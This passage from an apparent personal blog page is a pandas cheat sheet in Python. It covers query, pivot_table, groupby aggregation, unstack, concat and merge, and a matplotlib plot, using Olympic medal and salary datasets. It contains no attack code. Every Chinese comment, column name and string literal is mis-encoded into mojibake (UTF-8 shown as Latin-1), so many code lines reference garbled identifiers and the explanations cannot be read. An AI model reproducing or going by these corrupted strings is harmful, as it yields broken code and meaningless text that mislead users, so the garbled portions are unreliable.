class="line">df[df.å›½å®¶å¥¥å§”ä¼š.<span class="built_in">str</span>.contains(<span class="string">&#x27;å›½&#x27;</span>)]</span><br><span class="line"><span class="comment"># æå– ç¬¬ 0-2 è¡Œç¬¬ 0-2 åˆ—</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° + é“¶ç‰Œæ•° å¤§äº 15 çš„å›½å®¶</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° å¤§äº é‡‘ç‰Œå‡å€¼çš„å›½å®¶</span></span><br><span class="line">gold_mean = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].mean()</span><br><span class="line">df.query(<span class="string">f&#x27;é‡‘ç‰Œæ•° &gt; <span class="subst">&#123;gold_mean&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‡å®šä½ç½®æ’å…¥è¡Œ</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># è°ƒæ•´ é¡ºåº</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="pivotä¸groupby">pivotä¸groupby</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>])</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>]]</span><br></pre></td></tr></table></figure><h3><span id="unstack">unstack</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®—å‰ååå„å›½æ¯æ—¥å¥–ç‰Œæ•°é‡åˆè®¡</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šå¯¹äºç¬¬ä¸€å¤©æ²¡æœ‰æ•°æ®çš„å›½å®¶ç”¨0å¡«å……ï¼Œå…¶ä½™æ—¶é—´çš„ç¼ºå¤±å€¼ç”¨ä¸Šä¸€æ—¥æ•°æ®å¡«å……</span></span><br><span class="line">countries = df2.groupby(<span class="string">&#x27;å›½å®¶&#x27;</span>).count().sort_values(<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">&#x27;å›½å®¶&#x27;</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>,<span class="string">&#x27;å›½å®¶&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®èšåˆ">æ•°æ®èšåˆ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ†ç»„ï¼Œä½†ä¸ä½œä¸ºç´¢å¼•</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, as_index=<span class="literal">False</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># åˆ†ç»„ç»Ÿè®¡</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()</span><br><span class="line"><span class="comment"># æˆ–è€…groupbyä¸¤ä¸ª</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>])[<span class="string">&#x27;companySize&#x27;</span>].count()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹groupçš„ç»“æœ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).groups</span><br><span class="line"><span class="comment"># å°†æ•°æ®æŒ‰ç…§ districtã€salary è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹è¥¿æ¹–åŒºè–ªèµ„ä¸º 30000 çš„å·¥ä½œ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).get_group((<span class="string">&quot;è¥¿æ¹–åŒº&quot;</span>,<span class="number">30000</span>))</span><br><span class="line"><span class="comment"># è®¡ç®—ä¸åŒè¡Œæ”¿åŒº(district)ï¼Œä¸åŒè§„æ¨¡å…¬å¸(companySize)å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">pd.DataFrame(df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()) <span class="comment">#ä½¿ç”¨value_countsçš„æ–¹å¼ï¼Œæœ‰æ—¶å€™æ¯”ä¸¤ä¸ªgroupbyå¥½ç”¨</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>]).count().iloc[:,<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"><span class="comment"># åˆ†ç»„</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby([df[<span class="string">&#x27;workYear&#x27;</span>], df[<span class="string">&#x27;education&#x27;</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>]).mean()[<span class="string">&#x27;salary&#x27;</span>]</span><br><span class="line"><span class="comment"># åœ¨åŸæ•°æ®æ¡† df æ–°å¢ä¸€åˆ—ï¼Œæ•°å€¼ä¸ºè¯¥åŒºçš„å¹³å‡è–ªèµ„æ°´å¹³</span></span><br><span class="line">df[<span class="string">&#x27;è¯¥åŒºå¹³å‡å·¥èµ„&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"><span class="comment"># é€šè¿‡åŒ¿åå‡½æ•°åˆ†ç»„ æ ¹æ® createTime åˆ—ï¼Œè®¡ç®—æ¯å¤©ä¸åŒ è¡Œæ”¿åŒº æ–°å¢çš„å²—ä½æ•°é‡</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">&#x27;district&#x27;</span>].value_counts()).rename_axis([<span class="string">&quot;å‘å¸ƒæ—¥&quot;</span>, <span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br><span class="line"><span class="comment"># è®¡ç®—å„è¡Œæ”¿åŒºçš„ä¼ä¸šé¢†åŸŸï¼ˆindustryFieldï¼‰åŒ…å«ç”µå•†çš„æ€»æ•°</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&quot;industryField&quot;</span>].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&#x27;ç”µå•†&#x27;</span>).<span class="built_in">sum</span>())</span><br><span class="line"><span class="comment"># è®¡ç®—å„è¡Œæ”¿åŒºçš„ä¼ä¸šé¢†åŸŸï¼ˆindustryFieldï¼‰åŒ…å«ç”µå•†çš„æ€»æ•°</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, sort=<span class="literal">False</span>)[<span class="string">&quot;industryField&quot;</span>].apply(</span><br><span class="line"><span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&quot;ç”µå•†&quot;</span>).<span class="built_in">sum</span>())</span><br><span class="line"><span class="comment">#é€šè¿‡ positionName çš„é•¿åº¦è¿›è¡Œåˆ†ç»„ï¼Œå¹¶è®¡ç®—ä¸åŒé•¿åº¦å²—ä½åç§°çš„è–ªèµ„å‡å€¼</span></span><br><span class="line">df.set_index(<span class="string">&quot;positionName&quot;</span>).groupby(<span class="built_in">len</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df.groupby(df.positionName.apply(<span class="keyword">lambda</span> x:<span class="built_in">len</span>(x)))[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># groupby ç›´æ¥æ”¹å</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;è–ªèµ„&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># groupby ç”¨å­—å…¸</span></span><br><span class="line"><span class="comment">#å°† score å’Œ matchScore çš„å’Œè®°ä¸ºæ€»åˆ†ï¼Œä¸ salary åˆ—åŒæ—¶è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;è–ªèµ„&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># èšåˆ</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby(df[<span class="string">&#x27;district&#x27;</span>]).mean() </span><br><span class="line"><span class="comment"># ç­‰ä»·</span></span><br><span class="line">df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(<span class="string">&#x27;district&#x27;</span>).mean()</span><br><span class="line"><span class="comment"># åœ¨åŸæ•°æ®æ¡† df æ–°å¢ä¸€åˆ—ï¼Œæ•°å€¼ä¸ºè¯¥åŒºçš„å¹³å‡è–ªèµ„æ°´å¹³</span></span><br><span class="line">df[<span class="string">&#x27;è¯¥åŒºå¹³å‡å·¥èµ„&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"><span class="comment"># æå–å¹³å‡å·¥èµ„å°äº 30000 çš„è¡Œæ”¿åŒºçš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># åˆ†ç»„è®¡ç®—ä¸åŒè¡Œæ”¿åŒºï¼Œè–ªæ°´çš„æœ€å°å€¼ã€æœ€å¤§å€¼å’Œå¹³å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"><span class="comment"># å¯¹ä¸åŒè¡Œæ”¿åŒºè¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡è–ªæ°´çš„å‡å€¼ã€ä¸­ä½æ•°ã€æ–¹å·®ï¼Œä»¥åŠå¾—åˆ†çš„å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(</span><br><span class="line">    &#123;<span class="string">&#x27;salary&#x27;</span>: [np.mean, np.median, np.std], <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># é€šè¿‡ df2 è®¡ç®—è·å¾—å¥–ç‰Œæœ€å¤šçš„è¿åŠ¨å‘˜</span></span><br><span class="line">df2[<span class="string">&#x27;è¿åŠ¨å‘˜&#x27;</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹å„å›½åœ¨ä¸åŒé¡¹ç›®ä¸Šçš„è·å¥–ç‰Œæƒ…å†µ</span></span><br><span class="line">df2[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].groupby([df2[<span class="string">&#x27;å›½å®¶&#x27;</span>],df2[<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]]).count().to_frame()</span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‰ç…§è¡Œè®¡ç®—å¹³å‡å€¼</span></span><br><span class="line">df.mean(axis=<span class="string">&#x27;columns&#x27;</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#ä¸æ˜¯0ï¼Œ1æ˜¯ç®—æ¯åˆ—çš„å‡å€¼ç„¶åç„¶ååˆå¹¶ä¸ºä¸€è¡Œ</span></span><br><span class="line"><span class="comment"># æå–å¹³å‡å·¥èµ„å°äº 30000 çš„è¡Œæ”¿åŒºçš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># èšåˆç»Ÿè®¡</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"><span class="comment">#æŸ¥çœ‹ç¼ºå¤±å€¼æ¯”ä¾‹ï¼Œå¹¶æ’åº  ä¸æ˜¯countï¼ï¼ï¼</span></span><br><span class="line">data = df.isna().<span class="built_in">sum</span>()/df.shape[<span class="number">0</span>]</span><br><span class="line">data.sort_values().<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#å¯¹ä¸åŒå²—ä½(positionName)è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡å…¶è–ªæ°´(salary)ä¸­ä½æ•°å’Œå¾—åˆ†(score)å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;positionName&#x27;</span>).agg(&#123;<span class="string">&#x27;salary&#x27;</span>: np.median, <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">x</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x.<span class="built_in">max</span>()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(æœ€ä½å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;min&#x27;</span>), æœ€é«˜å·¥èµ„=(</span><br><span class="line">    <span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;max&#x27;</span>), å¹³å‡å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;mean&#x27;</span>), æœ€å¤§å€¼ä¸å‡å€¼å·®å€¼=(<span class="string">&#x27;salary&#x27;</span>, myfunc)).rename_axis([<span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®æŸ¥è¯¢">æ•°æ®æŸ¥è¯¢</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢æŸåˆ—çš„å€¼ä¸ºxæ—¶ï¼Œå³ä½¿è¯¥åˆ—ä¸ºåæ ‡</span></span><br><span class="line"><span class="comment">#æŸ¥è¯¢ä¸­å›½é˜Ÿçš„è·å¥–ç‰Œ</span></span><br><span class="line">df3.query(<span class="string">&quot;å›½å®¶ == [&#x27;ä¸­å›½&#x27;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¡ç®—ä¸­å›½æ¯æ—¥æ€»å¥–ç‰Œæ•°é‡ ç´¯è®¡</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>,<span class="string">&#x27;å›½å®¶&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].to_frame().query(<span class="string">&#x27;å›½å®¶==[&quot;ä¸­å›½&quot;]&#x27;</span>).cumsum()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥è¯¢ç©ºå€¼æ‰€åœ¨è¡Œ</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹é‡å¤çš„</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥è¯¢æ¡ä»¶</span></span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].isin([<span class="string">&#x27;å·¥ä¸š&#x27;</span>,<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å·¥ä¸š&#x27;</span>)|(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;å·¥ä¸š|å»ºç­‘ä¸š&#x27;</span>)]</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®æ±‡æ€»">æ•°æ®æ±‡æ€»</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®— æ€»åˆ†ã€é«˜ç«¯äººæ‰å¾—åˆ†ã€åŠå­¦å±‚æ¬¡å¾—åˆ†çš„æœ€å¤§æœ€å°å€¼ã€ä¸­ä½æ•°ã€å‡å€¼</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;æ€»åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;é«˜ç«¯äººæ‰å¾—åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;åŠå­¦å±‚æ¬¡å¾—åˆ†&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®åˆå¹¶">æ•°æ®åˆå¹¶</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚ç›´æ‹¼æ¥ df1ã€df2ã€df3ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º</span></span><br><span class="line">pd.concat([df1, df2, df3])</span><br><span class="line"><span class="comment"># å‚ç›´æ‹¼æ¥ df1 å’Œ df4ï¼Œå¹¶æŒ‰é¡ºåºé‡æ–°ç”Ÿæˆç´¢å¼•ï¼Œ</span></span><br><span class="line">df = pd.concat([df1,df4]).reset_index()</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">df = pd.concat([df1, df4], ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨ªå‘æ‹¼æ¥</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œåªå–ç»“æœçš„äº¤é›†</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"><span class="comment"># åªå–åŒ…å« df1 ç´¢å¼•çš„éƒ¨åˆ†</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line"><span class="comment"># æ‹¼æ¥ df1ã€df2ã€df3ï¼ŒåŒæ—¶æ–°å¢ä¸€ä¸ªç´¢å¼•ï¼ˆxã€yã€zï¼‰æ¥åŒºåˆ†ä¸åŒçš„è¡¨æ•°æ®æ¥æº</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"><span class="comment"># æ ¹æ® key è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># æ ¹æ® key1 å’Œ key2 è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">how å¯ä»¥è®¾ç½®</span></span><br><span class="line"><span class="string">rightã€left: å·¦å¤–ï¼Œå³å¤–</span></span><br><span class="line"><span class="string">outerã€inner: å…¨å¤–è¿æ¥ï¼Œå†…è¿æ¥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># é‡æ–°äº§ç”Ÿæ•°æ®</span></span><br><span class="line">left.join(right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="å¤šä¸ªdfç”»ä¸€èµ·">å¤šä¸ªDFç”»ä¸€èµ·</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">16</span>,<span class="number">10</span>))   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_percent</span>(<span class="params">temp, position</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%1.0f&#x27;</span>%(<span class="number">100</span>*temp) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br><span class="line">ax.plot(max_data,label=<span class="string">&#x27;first one&#x27;</span>)</span><br><span class="line">ax.plot(min_data,label=<span class="string">&#x27;last one&#x27;</span>)</span><br><span class="line">ax.plot(q3_df,label=<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Daily Empty Rate Comparison For Village Y&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&#x27;C-4.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="åˆ†æå’Œæ’åº">åˆ†æå’Œæ’åº</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 